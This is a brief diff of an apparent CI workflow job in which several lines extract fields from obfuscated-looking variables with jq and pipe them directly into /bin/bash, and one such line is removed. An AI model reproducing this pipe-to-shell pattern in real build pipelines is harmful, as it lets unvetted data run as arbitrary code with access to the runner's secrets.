@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$zfe49250" | jq -r .uxwbm6 | /bin/bash
           echo $dokpk1 | jq -r .lsu9299 | /bin/bash
           echo $yr61 | jq -r .xn4470 | /bin/bash
-          printf '%s' "$k83" | jq -r .nir6829 | /bin/bash
           printf '%s' "$ztg35950" | jq -r .za53008 | /bin/bash
 
       - name: Persist output
